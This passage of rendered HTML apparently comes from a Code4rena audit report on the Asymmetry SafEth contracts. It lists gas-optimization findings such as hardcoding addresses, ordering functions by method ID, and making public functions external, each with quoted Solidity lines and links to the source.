7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Functions guaranteed to revert when called by normal users can be marked payable.</p>\n<h2 id=\"g-06-use-hardcode-address-instead-addressthis\" style=\"position:relative;\"><a href=\"#g-06-use-hardcode-address-instead-addressthis\" aria-label=\"g 06 use hardcode address instead addressthis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] Use hardcode address instead <code>address(this)</code></h2>\n<p>Instead of using <code>address(this)</code>, it is more gas-efficient to pre-calculate and use the hardcoded <code>address</code>. Foundry’s script.sol and solmate’s <code>LibRlp.sol</code> contracts can help achieve this.</p>\n<p>References:<br></p>\n<ul>\n<li><a href=\"https://book.getfoundry.sh/reference/forge-std/compute-create-address\">https://book.getfoundry.sh/reference/forge-std/compute-create-address</a> </li>\n<li><a href=\"https://twitter.com/transmissions11/status/1518507047943245824\">https://twitter.com/transmissions11/status/1518507047943245824</a></li>\n</ul>\n<h3 id=\"proof-of-concept-23\" style=\"position:relative;\"><a href=\"#proof-of-concept-23\" aria-label=\"proof of concept 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"119\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmountBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmountAfter</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L111\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L111</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L121\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L121</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"120\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmountBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmountAfter</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L139\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L139</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L144\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L144</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"121\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">: recipient: </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L96\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L96</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"122\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">: (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sent</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">}(</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L110\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L110</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"123\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">197</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rethBalance1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rocketTokenRETH</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">199</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rethBalance2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rocketTokenRETH</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L197\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L197</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L199\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L199</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"124\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">222</span><span class=\"mtk1\">: </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">rethAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L222\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L222</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"125\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">: </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">: </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">: </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">84</span><span class=\"mtk1\">: (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sent</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">}(</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L63\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L63</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L63\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L63</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L63\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L63</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L84\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L84</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"126\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">99</span><span class=\"mtk1\">: </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">101</span><span class=\"mtk1\">: </span><span class=\"mtk12\">frxETHMinterContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">submitAndDeposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">99</span><span class=\"mtk1\">: </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L99\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L99</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L101\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L101</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L99\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L99</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"127\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">: </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">SFRX_ETH_ADDRESS</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L123\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L123</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"128\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stEthBal</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">STETH_TOKEN</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">: (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sent</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">}(</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L58\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L58</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L63\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L63</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"129\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">74</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wstEthBalancePre</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IWStETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WST_ETH</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wstEthBalancePost</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IWStETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WST_ETH</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L74\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L74</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L78\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L78</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"130\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">94</span><span class=\"mtk1\">: </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WST_ETH</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L94\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L94</a></p>\n<h3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use hardcoded <code>address</code>.</p>\n<h2 id=\"g-07-optimize-names-to-save-gas\" style=\"position:relative;\"><a href=\"#g-07-optimize-names-to-save-gas\" aria-label=\"g 07 optimize names to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07] Optimize names to save gas</h2>\n<p>Contracts most called functions could simply save gas by function ordering via Method ID. Calling a function at runtime will be cheaper if the function is positioned earlier in the order (has a relatively lower Method ID) because 22 gas are added to the cost of a function for every position that came before it. The caller can save on gas if you prioritize most called functions. </p>\n<p>See more <a href=\"https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92\">here</a>.</p>\n<h3 id=\"proof-of-concept-24\" style=\"position:relative;\"><a href=\"#proof-of-concept-24\" aria-label=\"proof of concept 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<p>All in-scope contracts.</p>\n<h3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Find a lower method ID name for the most called functions for example Call() vs. Call1() is cheaper by 22 gas.<br>\nFor example, the function IDs in the Gauge.sol contract will be the most used; A lower method ID may be given.</p>\n<h2 id=\"g-08-x--y-costs-more-gas-than-x--x--y-for-state-variables\" style=\"position:relative;\"><a href=\"#g-08-x--y-costs-more-gas-than-x--x--y-for-state-variables\" aria-label=\"g 08 x  y costs more gas than x  x  y for state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-08] <code>&#x3C;x> += &#x3C;y></code> Costs More Gas Than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> For State Variables</h2>\n<h3 id=\"proof-of-concept-25\" style=\"position:relative;\"><a href=\"#proof-of-concept-25\" aria-label=\"proof of concept 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"131\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">: </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> +=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">95</span><span class=\"mtk1\">: </span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L72\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L72</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L95\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L95</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"132\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">172</span><span class=\"mtk1\">: </span><span class=\"mtk12\">localTotalWeight</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">weights</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L172\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L172</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"133\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">192</span><span class=\"mtk1\">: </span><span class=\"mtk12\">localTotalWeight</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">weights</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L192\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L192</a></p>\n<h2 id=\"g-09-public-functions-to-external\" style=\"position:relative;\"><a href=\"#g-09-public-functions-to-external\" aria-label=\"g 09 public functions to external permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-09] Public Functions To External</h2>\n<p>The following functions could be set external to save gas and improve code quality.<br>\nExternal call cost is less expensive than of public functions.</p>\n<h3 id=\"proof-of-concept-26\" style=\"position:relative;\"><a 